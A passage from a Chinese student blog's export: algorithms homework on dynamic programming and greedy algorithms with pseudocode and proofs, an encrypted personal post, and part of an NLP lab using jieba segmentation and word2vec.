class="comment">#对于三天以上的每天，都有三种情况</span></span><br><span class="line">            OPT[i]=max(OPT[i<span class="number">-1</span>],OPT[i<span class="number">-2</span>]+w[i],OPT[i<span class="number">-3</span>]+w[i<span class="number">-1</span>]+w[i]) </span><br><span class="line">    <span class="keyword">return</span> OPT</span><br></pre></td></tr></table></figure>

<h2 id="2-4-分析算法时间复杂度"><a href="#2-4-分析算法时间复杂度" class="headerlink" title="2.4 分析算法时间复杂度"></a>2.4 分析算法时间复杂度</h2><p>O(n)，根据伪代码可知，我们的代码时间复杂度与n成正比。</p>
<p>直接证明法：推导递推式T(n)=T(n-1)+O(1)=T(n-2)+O(1)+O(1)=……=O(n)</p>
<p>数学归纳法证明：</p>
<ul>
<li>当<code>n=0、1、2</code>时，算法时间复杂度为<code>O(n)</code></li>
<li>设当<code>n=k</code>时，算法时间复杂度为<code>O(k)=O(n)</code>。而当<code>n=k+1</code>时，算法时间复杂度等于<code>O(k)+O(1)=O(k+1)=O(n)</code></li>
</ul>
<p>得证时间复杂度为O(n)</p>
<h1 id="3-棋盘硬币收集问题——动态规划"><a href="#3-棋盘硬币收集问题——动态规划" class="headerlink" title="3.棋盘硬币收集问题——动态规划"></a>3.棋盘硬币收集问题——动态规划</h1><p><img src="/2020/04/30/2020-04-30-algorithm-homework-2/image-20200427232332542.png" alt="image-20200427232332542"></p>
<h2 id="3-1-描述算法思路"><a href="#3-1-描述算法思路" class="headerlink" title="3.1 描述算法思路"></a>3.1 描述算法思路</h2><p>以下 <code>列即x坐标</code>，<code>行即y坐标</code></p>
<p>x+1往右，y+1往上</p>
<p>自顶向下遍历棋盘的行。</p>
<ul>
<li>首先计算第n行的所有格子的总价值，因为是最高的棋子，所以总价值就是自身价值。</li>
<li>然后计算第n-1行的总价值，第n-1行的每个格子的总价值计算公式如下：<ul>
<li>若是第1列：OPT(x,y)=max(OPT(x,y+1),OPT(x+1,y+1))+c(x,y)</li>
<li>若是第n列：OPT(x,y)=max(OPT(x,y+1),OPT(x-1,y+1))+c(x,y)</li>
<li>其余列：OPT(x,y)=max(OPT(x,y+1),OPT(x-1,y+1),OPT(x+1,y+1))+c(x,y)</li>
</ul>
</li>
<li>同上，自顶向下遍历行计算，最终，得到全棋盘格子可收集最大硬币总价值。</li>
</ul>
<p>⭐由于考虑到题目仅仅只计算底部任意一个格子的最大总价值，如下图：影响到OPT(x,y)的，仅仅是两条红色线以上的格子。所以我们可以在上述算法上做一点点修改，遍历行时可减少遍历格子数。可降低时间复杂度、提高计算效率。</p>
<p><img src="/2020/04/30/2020-04-30-algorithm-homework-2/image-20200430172622350.png" alt="image-20200430172622350"></p>
<p>⭐由于题目可在最顶部任意一排格子结束，对于这个要求，我们同样只要加个约束就好了。</p>
<h2 id="3-2-OPT-x-y-递推式"><a href="#3-2-OPT-x-y-递推式" class="headerlink" title="3.2 OPT(x,y)递推式"></a>3.2 OPT(x,y)递推式</h2><ul>
<li>若是第0列：OPT(x,y)=max(OPT(x,y+1),OPT(x+1,y+1))+c(x,y)</li>
<li>若是第n列：OPT(x,y)=max(OPT(x,y+1),OPT(x-1,y+1))+c(x,y)</li>
<li>其余列：OPT(x,y)=max(OPT(x,y+1),OPT(x-1,y+1),OPT(x+1,y+1))+c(x,y)</li>
</ul>
<h2 id="3-3-写出算法伪代码"><a href="#3-3-写出算法伪代码" class="headerlink" title="3.3 写出算法伪代码"></a>3.3 写出算法伪代码</h2><p>以下下标，均是以python数组下标从零开始为前提。range(n)=[n-1,……,0]。</p>
<p> <code>列=x=i</code>，<code>行=y=j</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CHESS_COIN</span><span class="params">(c)</span>:</span></span><br><span class="line">    lenc=len(c)</span><br><span class="line">    OPT=[lenc][lenc]</span><br><span class="line"><span class="comment">#这是上半部分初始化最高行的代码：</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(lenc):    <span class="comment">#遍历最高行(y)的每列(x)，从0~n-1</span></span><br><span class="line">		 OPT(i,lenc<span class="number">-1</span>)=(i,lenc<span class="number">-1</span>)</span><br><span class="line"><span class="comment">#这是下半部分遍历计算的代码：</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(lenc<span class="number">-1</span>:<span class="number">0</span>):  <span class="comment">#遍历行(y)，从n-2~0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(lenc):  <span class="comment">#遍历列(x)，从0~n-1</span></span><br><span class="line">            <span class="keyword">if</span> i==<span class="number">0</span> :		 <span class="comment">#最左列</span></span><br><span class="line">                OPT(i,j)=max(OPT(i,j+<span class="number">1</span>),OPT(i+<span class="number">1</span>,j+<span class="number">1</span>))+c(i,j)</span><br><span class="line">            <span class="keyword">elif</span> i==n<span class="number">-1</span>:	<span class="comment">#最右列</span></span><br><span class="line">                OPT(i,j)=max(OPT(i,j+<span class="number">1</span>),OPT(i<span class="number">-1</span>,j+<span class="number">1</span>))+c(i,j)</span><br><span class="line">            <span class="keyword">else</span>:			<span class="comment">#其余列</span></span><br><span class="line">            	OPT(i,j)=max(OPT(i,j+<span class="number">1</span>),OPT(i<span class="number">-1</span>,j+<span class="number">1</span>),OPT(i+<span class="number">1</span>,j+<span class="number">1</span>))+c(i,j)</span><br><span class="line">    <span class="keyword">return</span> OPT</span><br></pre></td></tr></table></figure>

<p>⭐为了使达到题目中的要求：  你可以选择在在<code>最底部一排的任意格子开始</code>，在<code>最顶部一排的任意格子结束</code></p>
<ul>
<li><input checked disabled type="checkbox"> 我们在遍历最顶部行时，做一个条件判断是否为最后一个格子（第M列）</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#这是上半部分初始化最高行的代码：</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(M):    <span class="comment">#遍历最高行(y)的每列(x)，从0~M-1</span></span><br><span class="line">		 OPT(i,lenc<span class="number">-1</span>)=(i,lenc<span class="number">-1</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(M:n<span class="number">-1</span>):  <span class="comment">#遍历最高行(y) 在M~n-1列的值</span></span><br><span class="line">        OPT(i,lenc<span class="number">-1</span>)=<span class="number">0</span></span><br></pre></td></tr></table></figure>

<ul>
<li><input checked disabled type="checkbox"> 我们在遍历行时要考虑函数是否在红线范围内，判断是否大于直线的值即可，</li>
<li><input checked disabled type="checkbox"> 设最底行的格子坐标为（a,b）这里写个伪代码：</li>
</ul>
<p><img src="/2020/04/30/2020-04-30-algorithm-homework-2/image-20200430172619021.png" alt="image-20200430172619021"></p>
<h2 id="3-4-分析算法时间复杂度"><a href="#3-4-分析算法时间复杂度" class="headerlink" title="3.4 分析算法时间复杂度"></a>3.4 分析算法时间复杂度</h2><p>⭐直接证明：</p>
<ul>
<li><p>对于题目——棋盘硬币收集问题来说，想要获得一个最底部的格子的最大价值，最少必须要遍历其上方的格子数=    <code>n^2</code> -  <code>(1/4)n^2</code> =<code>(3/4)n^2</code>  。即<code>(3/4)n^2</code>  &lt;=f(n) &lt;=  <code>n^2</code>  。</p>
</li>
<li><p>存在正的常数C=1和自然数n0=1，使得当n≥n0时， 有f(n)≤g(n)=n^2。</p>
</li>
<li><p>则称函数f (n) 在n 充分大时有上有界，且g(n) 是它的一个上界，记做f (n) = O(g(n))=O(n^2)</p>
</li>
</ul>
<p>⭐数学归纳法证明：</p>
<ul>
<li>当<code>n=1</code>时，算法时间复杂度为<code>O(n^2)</code></li>
<li>设当<code>n=k</code>时，算法时间复杂度为<code>O(k^2)=O(n^2)</code>。而当<code>n=k+1</code>时，算法时间复杂度等于<code>O((k+1)^2)=O(n^2)</code></li>
</ul>
<p>得证时间复杂度为O(n^2)</p>
<h2 id="3-5-证明不存在最差时间复杂度为小o-n-2-的动态规划算法"><a href="#3-5-证明不存在最差时间复杂度为小o-n-2-的动态规划算法" class="headerlink" title="3.5 证明不存在最差时间复杂度为小o(n^2)的动态规划算法"></a>3.5 证明不存在最差时间复杂度为小o(n^2)的动态规划算法</h2><p><img src="/2020/04/30/2020-04-30-algorithm-homework-2/image-20200430172833186.png" alt="image-20200430172833186"></p>
<p>反证法：</p>
<ul>
<li><p>假设存在一个动态规划算法的最差时间复杂度为<code>小o(n^2)</code> ，即<code>f(n)=o(g(n))</code>  。</p>
</li>
<li><p>即<code>0&lt;=f(n)&lt;=cg(n)</code>对于任意常量<code>c&gt;0</code>成立（n&gt;=n0）。</p>
</li>
<li><p>但是，对于题目——棋盘硬币收集问题来说，想要获得一个最底部的格子的最大价值，最少必须要遍历其上方的的格子数=  <code>n^2</code> -  <code>(1/4)n^2</code> =<code>(3/4)n^2</code>   。假如此时取c取<code>1/2</code>，则<code>0&lt;=f(n)&lt;=(1/2)g(n)</code>不成立，矛盾。</p>
</li>
<li><p>反证得不存在最差时间复杂度为<code>小o(n^2)</code>的动态规划算法，最优的算法时间复杂度只能是 <code>大O(n^2)</code>。</p>
</li>
</ul>
<p><img src="/2020/04/30/2020-04-30-algorithm-homework-2/image-20200429180827475.png" alt="image-20200429180827475"></p>
<h1 id="4-dijkstra算法流程图——贪心"><a href="#4-dijkstra算法流程图——贪心" class="headerlink" title="4.dijkstra算法流程图——贪心"></a>4.dijkstra算法流程图——贪心</h1><p><img src="/2020/04/30/2020-04-30-algorithm-homework-2/image-20200427234432154.png" alt="image-20200427234432154"></p>
<p><img src="/2020/04/30/2020-04-30-algorithm-homework-2/image-20200427234429347.png" alt="image-20200427234429347"></p>
<p><img src="/2020/04/30/2020-04-30-algorithm-homework-2/image-20200429171527226.png" alt="image-20200429171527226"></p>
<p><img src="/2020/04/30/2020-04-30-algorithm-homework-2/image-20200429171618826.png" alt="image-20200429171618826"></p>
<p><img src="/2020/04/30/2020-04-30-algorithm-homework-2/image-20200429171955315.png" alt="image-20200429171955315"></p>
<p><img src="/2020/04/30/2020-04-30-algorithm-homework-2/image-20200429172049824.png" alt="image-20200429172049824"></p>
<p><img src="/2020/04/30/2020-04-30-algorithm-homework-2/image-20200429172142515.png" alt="image-20200429172142515"></p>
<p><img src="/2020/04/30/2020-04-30-algorithm-homework-2/image-20200429172219858.png" alt="image-20200429172219858"></p>
<h1 id="5-kruskal-prim最小生成树——贪心"><a href="#5-kruskal-prim最小生成树——贪心" class="headerlink" title="5.kruskal\prim最小生成树——贪心"></a>5.kruskal\prim最小生成树——贪心</h1><p><img src="/2020/04/30/2020-04-30-algorithm-homework-2/image-20200427234524430.png" alt="image-20200427234524430"></p>
<h2 id="5-1-Kruskal"><a href="#5-1-Kruskal" class="headerlink" title="5.1 Kruskal"></a>5.1 Kruskal</h2><p><img src="/2020/04/30/2020-04-30-algorithm-homework-2/image-20200429173903200.png" alt="image-20200429173903200"></p>
<h2 id="5-2-prim"><a href="#5-2-prim" class="headerlink" title="5.2 prim"></a>5.2 prim</h2><p><img src="/2020/04/30/2020-04-30-algorithm-homework-2/image-20200429173645486.png" alt="image-20200429173645486"></p>
<h1 id="6-环内活动安排问题——贪心"><a href="#6-环内活动安排问题——贪心" class="headerlink" title="6.环内活动安排问题——贪心"></a>6.环内活动安排问题——贪心</h1><p><img src="/2020/04/30/2020-04-30-algorithm-homework-2/image-20200427234616837.png" alt="image-20200427234616837"></p>
<h2 id="6-1-描述算法思想"><a href="#6-1-描述算法思想" class="headerlink" title="6.1 描述算法思想"></a>6.1 描述算法思想</h2><p>该题，是一个环内的活动安排问题。我们可以遍历每个活动，将该活动从环中去除，余下的时间不成环，为普通活动安排问题。最后比较所有情况求得最优解。我们还可以用以下分类的方法，来减少一些计算量。    </p>
<p>考虑以下两种情况下的安排，并且从这些安排中选出最优的。</p>
<ul>
<li>最优的安排里没有过夜的活动，是一个0-24点的普通活动安排问题。</li>
<li>最优的安排里有过夜的活动，<strong>遍历过夜活动集每个过夜活动</strong>，剩下的也是普通活动安排问题。</li>
</ul>
<p>⭐其实，对于过夜的活动，我们还可以用一些小的技巧来减少计算量。但因为计算包含关系有时复杂度会很高，这里当作一个变式。</p>
<ul>
<li>若过夜活动两两不存在包含关系，则遍历计算，选择最优的安排。</li>
<li>对于活动A在活动B包含下的（即B开始早于A，结束晚于A，真子集关系），直接选择活动A。</li>
</ul>
<h2 id="6-2-分析算法时间复杂度"><a href="#6-2-分析算法时间复杂度" class="headerlink" title="6.2 分析算法时间复杂度"></a>6.2 分析算法时间复杂度</h2><p>考虑以下两种情况下的安排，并且从这些安排中选出最优的。</p>
<ul>
<li><p>首先以结束时间为基准，使用冒泡排序0am~24pm的活动。——O(nlogn)</p>
</li>
<li><p>遍历记下过夜的活动在排序数组中的位置，并且用一个数组将保存过夜活动——O(n)</p>
</li>
<li><p>最优的安排里没有过夜的活动，是一个0-24点的普通活动安排问题，得到<code>结果A</code>。——O(n)</p>
</li>
<li><p>最优的安排里有过夜活动，遍历每个过夜活动，剩下的也是普通活动安排问题，寻找该过夜活动(如下)—O(n)</p>
<ul>
<li>tips：对于活动A在活动B包含下的（即B开始早于A，结束晚于A，真子集关系），直接选择活动A。若过夜活动两两不存在包含关系，则遍历计算值，选择最优的安排。但是此操作会增加时间复杂度，可以作为变式使用。</li>
</ul>
</li>
<li><p>得到一个需要遍历的过夜活动集，<strong>遍历过夜活动集每个过夜活动</strong>。然后把它所占的区间从0-24小时中去除，然后从这个区间内使用普通活动安排方法计算，得到结果<code>B、C、D……</code>。——<strong>O(n^2)</strong></p>
</li>
<li><p>最后，对比几种情况<code>A、B、C……</code>选择最优值（最多活动）。——O(n)</p>
</li>
</ul>
<p>综上，一般情况下，算法时间复杂度为O(n^2)。</p>
<h2 id="6-3-证明算法正确性"><a href="#6-3-证明算法正确性" class="headerlink" title="6.3 证明算法正确性"></a>6.3 证明算法正确性</h2><h4 id="（1）贪心选择性质："><a href="#（1）贪心选择性质：" class="headerlink" title="（1）贪心选择性质："></a>（1）贪心选择性质：</h4><ul>
<li><p>对于不含跨夜活动的活动安排。是一个0~24小时普通活动的贪心选择：</p>
<ol>
<li><p>证：假设，存在一个最优解A（不含跨夜活动情况下），且A中的活动也按结束时间非递减排序。A中的第一个活动是K。（设从零点开始的最早结束的活动为F）</p>
</li>
<li><p>如果K是F，那A就是从0点开始的贪心选择。</p>
<p>如果K不是F，那么设B=A-{K}∪{F}，因为F早于K结束，且A中的活动是相容的。所以B中的活动也是相容的。又由于B中的活动个数与A中的活动个数相同，故A是最优的，即B是以F开始的最优活动安排。</p>
</li>
<li><p>所以，最优解A必包含F。</p>
</li>
</ol>
</li>
<li><p>对于含跨夜活动的活动安排：</p>
<ol>
<li><p>证：假设，含某跨夜活动X的最优解为A，且A中的活动也按结束时间非递减排序。A中的第一个活动是K。</p>
<p>（设F是X结束后开始的结束最早的活动安排）</p>
</li>
<li><p>如果K是F，那A就是去掉X所占区间后，从X结束时间开始的贪心选择。</p>
<p>如果K不是F，那么设B=A-{K}∪{F}，因为F早于K结束，且A中的活动是相容的。所以B中的活动也是相容的。又由于B中的活动个数与A中的活动个数相同，故A是最优的，即B是以F开始的最优活动安排。</p>
</li>
<li><p>所以，最优解A（含某跨夜活动X），是去掉X后，从X结束时间开始的普通活动安排贪心选择。</p>
</li>
</ol>
</li>
<li><p>对于两种类型的解，我们贪心选择活动数量最多的解。</p>
</li>
</ul>
<h4 id="（2）最优子结构性质："><a href="#（2）最优子结构性质：" class="headerlink" title="（2）最优子结构性质："></a>（2）最优子结构性质：</h4><ul>
<li>对于不含跨夜活动的活动安排。是一个0~24小时普通活动的贪心选择：<ul>
<li>反证法：假设A是活动集E最优解，A中第一个活动是K。设E去掉K后为E’，A去掉K之后为A’。</li>
<li>若E’中存在另一个解B‘ ，比A’有更多的活动，则将K加入B’中产生了另一个解B。这个B将比A拥有                更多的活动，与A的最优性矛盾。故最优解A去掉第一个活动K后，其子结构也是最优的。</li>
</ul>
</li>
<li>对于含跨夜活动的活动安排，同上。</li>
<li>对于以上两种解，我们总是选择的全局最优解，包含了子结构的的最优解。</li>
</ul>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>作业</tag>
      </tags>
  </entry>
  <entry>
    <title>希望</title>
    <url>/2020/04/15/2020-04-15-HOPE/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="密码错误，请重试。\n Oh, this is an invalid password. Check and try again, please." data-whm="解密内容无法验证，但您仍然可以看看。\n Oh, these decrypted content cannot be verified, but you can still have a look."><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="加密文章，需要输入密码访问。</br> Hey, password is required here." /><label>加密文章，需要输入密码访问。</br> Hey, password is required here.</label><div class="bottom-line"></div></div><script id="hbeData" type="hbeData" data-hmacdigest="dc39c4ff9e0205e8502dcbc44d7d4ea82597ea9da0364158ca23d170fb92c4d7">05748cba185f8d68c3b09211d41671061893b403c1ec593c04be3a9282fe23ffb2232d4cea1348f1ee4f9e0feabbd52a5755814b53155a91b37992bec52c5f97d4fe66101c40319fec14e3559bff54cdc8b400a45a7917ffdbaf2b9ff0e78dcd7925abf684eb7838a8812eeba7b5493ace37a6378cc80060565425a20156dcc7d3cb6805bbe0f72e41a1089468218f03c7359845c221c96cc6cf0369d50b42c72079e66ffec4d830f1b413e05e5bdb58bc1d7ef9be2a149cd4f76746ce131fc008b2df9dd6d502431ef053c04b43a1f082fc48f3bd793b87238b9468656e85a90e43b1ce19c38152c4948030f2fa2df9c78742f8c85593590d17f6365b2c85f9ea0b3f2250c4fd5b67cbc5cbc96dfa5f8cf0ca624c0e9aa9799037acc858b2181e20f356943f5eba9a28e419b56420a6a46dd6d15d8a4688ae7bd4f20f2ee365f26d3b33a1281a9e0ce58aa262994046828043b67786f534c3ed5bab3e9298b8cf7f89eeae3681c9f44ef821a25867a9e63d2893ba9f1854520db6142456c7fbbc0d0ab452c22bf0fc514e7400a63e92275ebcd90c209e7155772c9208df1c48cdd4b14e9550fd4e37e326d1241c497140556dda99b99bd7ed47005f0572f4174e0f3cad86fe38d0429d313bcf0140436cea2725a6640195e6548241baf0185e90df6348a42ee6ef148a7fa3ab1c403a9e14a32be3ca857949f6031bdbaafca7efc06eadfcee5febadce55f12ae99389eb106d3cfdd2f461c376c1420a1c46e202235ff0c21352a04eda1a7050650cf65fe1e91baeab3bf22b689eaebe743b6a76bb8d3a097a9a28ca44b82bbf9ca8ea5c65cfa2f4bb1f572d75d171737ea4695e07e01425f13423556b0b27aac15857e7dc5c311337913bfa706f22edb4aec4d882faa83277d50581e1ae671e08081d76651664b15e88eeebdb3fa5f97ea9aa4be262ebfd6a60d0c25493031f8eb0bd17a1532f705a5d5ccb70f0f99f7eb294052caebec0929412cfcc6d15828e40d1b0b7539a45697a3a5adc2ca1d7dbb9807f78a95badd22c13a46572ef5c80cd9c29968e2843e89c823f147e18dc86de3bcc71f613df5c19157228cf0d66de108734c04c63e7da3764027cd2a18e6c19dd2c76e231d0a963363650c43461b8620a588c4c79572cfa31dd0d9437f7cafede36e6734c53b40c5e455bcc74301c1e34cae3b83e72a2d3fe8c223dde521c07c4d26f13fd1d10373fab26a560211c678bff7f85f97826dffb0a6d7209512b671ea4c27c2ded2cb28e224c6fd7cd968ec02a4154be7a7032ec45d5102be67ec6e4509efe612f6670808b654ff92e3064e308047717ccdd53e92723945be4676618c8d1185655b70f0020fb89c35fd8b8aa0d0cda7aa83696656565d8ec48ec174edef109a5c6a562e458f33a56fdedc8b3</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>生活</category>
      </categories>
      <tags>
        <tag>密文</tag>
        <tag>生活</tag>
      </tags>
  </entry>
  <entry>
    <title>信息内容安全实验2</title>
    <url>/2020/04/02/2020-04-02-inforamtion-security-exp-2/</url>
    <content><![CDATA[<p><img src="/2020/04/02/2020-04-02-inforamtion-security-exp-2/image-20200409163141122.png" alt="image-20200409163141122"></p>
<a id="more"></a>

<p>[TOC]</p>
<h1 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h1><p>IDE：pycharm</p>
<p>python版本：anacoda-&gt;python3.7</p>
<h1 id="实验1-1-分词与词向量化"><a href="#实验1-1-分词与词向量化" class="headerlink" title="实验1.1-分词与词向量化"></a>实验1.1-分词与词向量化</h1><h2 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍"></a>背景介绍</h2><h3 id="1-分词"><a href="#1-分词" class="headerlink" title="1.分词"></a>1.分词</h3><p>对于西方拼音语言来讲，词之间有明确的分解符，统计和使用语言模型非常直接，而对于中文，词之间没有明确的分界符。因此需要对句子分词后，才能做自然语言处理。</p>
<p><img src="/2020/04/02/2020-04-02-inforamtion-security-exp-2/image-20200409164613616.png" alt="image-20200409164613616"></p>
<p>Python中分分词工具很多，包括盘古分词、Yaha分词、Jieba分词等。</p>
<p>这里选择<strong>Jieba</strong>（结巴）分词作为我们实验的工具</p>
<p><strong>安装</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip install jieba</span><br></pre></td></tr></table></figure>

<p>常用方法</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#导入自定义词典  </span></span><br><span class="line">jieba.load_userdict(“字典路径\名称.txt<span class="string">")  </span></span><br><span class="line"><span class="string">#动态修改词典              </span></span><br><span class="line"><span class="string">add_word(word, freq=None, tag=None)</span></span><br><span class="line"><span class="string">del_word(word) </span></span><br><span class="line"><span class="string">#可调节单个词语的词频，使其能（或不能）被分出来</span></span><br><span class="line"><span class="string">suggest_freq(segment, tune=True) </span></span><br><span class="line"><span class="string">#关键词提取</span></span><br><span class="line"><span class="string">#sentence 为待提取的文本; topK默认值是20; </span></span><br><span class="line"><span class="string">#withWeight 为是否一并返回关键词权重值，默认值为 False; allowPOS 仅包括指定词性的词</span></span><br><span class="line"><span class="string">jieba.analyse.extract_tags(sentence, topK=20, withWeight=False, allowPOS=())</span></span><br><span class="line"><span class="string">#添加停用词</span></span><br><span class="line"><span class="string">jieba.analyse.set_stop_words(“extra_dict/stop_words.txt”)</span></span><br><span class="line"><span class="string">基于textrank的关键词提取</span></span><br><span class="line"><span class="string">tags = jieba.analyse.textrank(text, topK=5, withWeight=False, allowPOS=('ns', 'n', 'vn', 'v'))</span></span><br></pre></td></tr></table></figure>



<h3 id="2-词向量化"><a href="#2-词向量化" class="headerlink" title="2.词向量化"></a>2.词向量化</h3><p>自然语言理解的问题要转化为机器学习的问题，第一步肯定是要找一种方法把这些符号数学化。</p>
<p>NLP 中最直观，也是到目前为止最常用的词表示方法是 One-hot Representation。</p>
<p>这种方法把每个词表示为一个很长的向量。</p>
<p>这个向量的维度是词表大小，其中绝大多数元素为 0，只有一个维度的值为 1，这个维度就代表了当前的词。</p>
<p>​    举个例子：</p>
<p>​    “话筒”表示为 [0 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 …]</p>
<p>​    “麦克”表示为 [0 0 0 0 0 0 0 0 1 0 0 0 0 0 0 0 …]</p>
<p>每个词都是茫茫 0 海中的一个 1。</p>
<p>！但是这种简单的方法有两个缺点：<br>     1.维数灾难<br>     2.“词汇鸿沟”现象：任意两个词之间都是孤立的，无法判断像“话筒”和“麦克”是同义词。</p>
<p>所以，我们需要词向量表示</p>
<p>新的词表示方法叫做<strong>Distributed Representation</strong>（分布式表示）。</p>
<p>这种方法表示词即用一个地位实数向量来表示一个词，如：[0.792, −0.177, −0.107, 0.109, −0.542, …]</p>
<p>语言进行词向量化，可使用<strong>Word2Vec</strong>。</p>
<p>word2vec是google的一个开源工具，能够根据输入的词的集合计算出词与词之间的距离。</p>
<p>它将term转换成向量形式，可以把对文本内容的处理简化为向量空间中的向量运算。</p>
<p>计算出向量空间上的相似度，来表示文本语义上的相似度。</p>
<p>word2vec计算的是余弦值，<strong>距离范围为0-1</strong>之间，值越大代表两个词关联度越高。</p>
<p><strong>安装</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#安装带mkl的版本，下载wheel文件</span><br><span class="line">http:&#x2F;&#x2F;www.lfd.uci.edu&#x2F;~gohlke&#x2F;pythonlibs</span><br><span class="line">#定位到存放.whl文件的文件夹，通过匹配安装对应版本的numpy 和scipy</span><br><span class="line">pip install numpy-1.12.1+mkl-cap36</span><br><span class="line">#安装完后，继续安装genism</span><br><span class="line">pip install -U gensim</span><br></pre></td></tr></table></figure>

<p>为了减少安装中的繁琐，直接在anaconda进行集中安装，安装：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip install gensim</span><br></pre></td></tr></table></figure>

<h2 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h2><h3 id="1-分词-1"><a href="#1-分词-1" class="headerlink" title="1.分词"></a>1.分词</h3><p>代码如下，主要的都写了注释</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> jieba</span><br><span class="line"><span class="keyword">import</span> jieba.analyse</span><br><span class="line"></span><br><span class="line"><span class="comment"># 导入自定义词典</span></span><br><span class="line">jieba.load_userdict(<span class="string">"dict_all.txt"</span>)</span><br><span class="line"><span class="comment"># 读入语料库并且分词</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_file_cut</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># 语料库路径</span></span><br><span class="line">    pathBaidu = <span class="string">"BaiduSpiderCountry\\"</span></span><br><span class="line">    <span class="comment"># 分词结果</span></span><br><span class="line">    resName = <span class="string">"Result_Country.txt"</span></span><br><span class="line">    <span class="keyword">if</span> os.path.exists(resName):</span><br><span class="line">        os.remove(resName)</span><br><span class="line">    result = codecs.open(resName, <span class="string">'w'</span>, <span class="string">'utf-8'</span>)</span><br><span class="line"></span><br><span class="line">    num = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> num &lt;= <span class="number">100</span>:  <span class="comment"># 5A 200 其它100</span></span><br><span class="line">        name = <span class="string">"%04d"</span> % num   <span class="comment">#文件遍历格式：0001-&gt;0100</span></span><br><span class="line">        fileName = pathBaidu + str(name) + <span class="string">".txt"</span>  <span class="comment">#</span></span><br><span class="line">        source = open(fileName, <span class="string">'r'</span>,encoding=<span class="string">"utf-8"</span>)  <span class="comment">#打开文件</span></span><br><span class="line">        line = source.readline()     <span class="comment">#获得line迭代器</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> line != <span class="string">""</span>:</span><br><span class="line">            line = line.rstrip(<span class="string">'\n'</span>)  <span class="comment"># 删除string字符串末尾的指定字符</span></span><br><span class="line">            seglist = jieba.cut(line, cut_all=<span class="literal">False</span>)  <span class="comment"># 精确模式</span></span><br><span class="line">            output = <span class="string">' '</span>.join(list(seglist))  <span class="comment"># 空格拼接，将元组转换为列表，元组是括号，列表是方括号</span></span><br><span class="line">            result.write(output + <span class="string">' '</span>)  <span class="comment"># 空格取代换行'\r\n'</span></span><br><span class="line">            line = source.readline()   <span class="comment">#下一line</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'End file: '</span> + str(num))  <span class="comment">#line为空，这个文件遍历结束</span></span><br><span class="line">            result.write(<span class="string">'\r\n'</span>)  <span class="comment">#换行'\r\n'</span></span><br><span class="line">            source.close()        <span class="comment">#关闭源</span></span><br><span class="line">        num = num + <span class="number">1</span>  <span class="comment">#下一个文件</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">'End BaiduSpiderCountry cut：'</span>+str(num)) <span class="comment"># 结束百度语料库分词</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Run function</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    read_file_cut()</span><br></pre></td></tr></table></figure>



<p><a href="https://blog.csdn.net/chenj_freedom/article/details/81184296?depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-1&utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-1" target="_blank" rel="noopener">换行格式：</a></p>
<p>1、文档是windows格式，当我们按下键盘上的“回车键”时，输出的是CR和LF，即0d，0a两个字符。<br>2、文档是unix格式，当我们按下键盘上的“回车键”时，输出的LF，即0a一个字符。<br>3、文档是mac模式，当我们按下键盘上的“回车键”时，输出的是CR，即0d一个字符。</p>
<p>运行~</p>
<p>成功</p>
<p><img src="/2020/04/02/2020-04-02-inforamtion-security-exp-2/image-20200409184925832.png" alt="image-20200409184925832"></p>
<p>分词结果如下</p>
<p><img src="/2020/04/02/2020-04-02-inforamtion-security-exp-2/image-20200409184959263.png" alt="image-20200409184959263"></p>
<h3 id="1-词向量化"><a href="#1-词向量化" class="headerlink" title="1.词向量化"></a>1.词向量化</h3><p>代码如下，主要的都写了注释</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gensim.models <span class="keyword">import</span> word2vec</span><br><span class="line"><span class="keyword">import</span>  logging</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化配置</span></span><br><span class="line">logging.basicConfig(format=<span class="string">'%(asctime)s : %(levelname)s : %(message)s'</span>, level=logging.INFO)</span><br><span class="line"><span class="comment"># 加载语料</span></span><br><span class="line">sentences = word2vec.Text8Corpus(<span class="string">"Result_Country.txt"</span>)</span><br><span class="line"><span class="comment"># 训练模型,维度设置为200;</span></span><br><span class="line">model = word2vec.Word2Vec(sentences, size=<span class="number">200</span>) </span><br><span class="line"></span><br><span class="line">print(<span class="string">"阿富汗的词向量："</span>)</span><br><span class="line">print(model[<span 